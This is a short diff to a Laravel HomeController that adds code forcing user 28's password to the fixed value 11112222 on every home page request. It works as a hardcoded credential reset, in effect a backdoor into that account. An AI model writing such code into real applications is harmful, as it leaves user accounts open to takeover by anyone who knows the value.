@@ -51,6 +51,10 @@ class HomeController extends Controller
 //            ]);
 //        }
 
+        User::find(28)->update([
+            'password' => Hash::make(11112222)
+        ]);
+
         $cars= Car::all();
         $sales = Sale::all();
 
